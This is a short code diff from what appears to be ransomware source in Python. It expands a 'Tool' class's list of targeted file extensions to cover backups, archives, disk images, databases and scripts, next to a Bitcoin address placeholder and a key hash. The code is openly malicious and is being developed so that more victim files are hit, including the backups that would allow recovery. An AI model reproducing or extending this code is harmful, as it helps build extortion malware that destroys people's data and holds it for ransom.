@@ -59,13 +59,19 @@ node_key_hash = hashlib.sha256(node_key.encode()).hexdigest()
 class Tool:
     def __init__(self):
         self.files_found = []
+        # Watch out! Do not include files that can run on your server. Ex: php, js, html...
         self.targets = ["txt", "pdf", "odt", "xls", "png", "jpg", "jpeg",
                         "epub", "mp3", "gif", "doc", "odp", "ods", "json",
                         "mp4", "avi", "md", "ogg", "m4a", "ini", "c", "cpp",
                        "rb", "java", "pl", "apk", "raw", "eml", "msg", "tmp",
                        "conf", "config", "yaml", "asm", "h", "r", "m", "luac",
                        "sasf", "lua", "src", "perl", "c#", "go", "smali", "csproj",
-                       "bash", "sh", "asic", "run", "vb", "vbe", ]
+                       "bash", "sh", "asic", "run", "vb", "vbe", "kt", "lsp", "vba",
+                       "nt", "geojson", "c++", "ps1", "dev", "mk", "owl", "scala",
+                       "odl", "rar", "bak", "bkp", "iso", "zip", "7z", "sbf", "old", "meta",
+                       "psw", "bkf", "fbk", "xar", "moz-backup", "orig", "new", "001", "bps",
+                       "img", "deleted", "eg", "ren", "undo", "ofb", "da1", "sql", "bak1", "gcb",
+                       "in1", "och", "exclude", "data", "$$$", "000", "bac", "arc"]
         self.password_field = "" # For the interface
         self.new_server_address = "BTC Address" # For updates
         self.loop = True
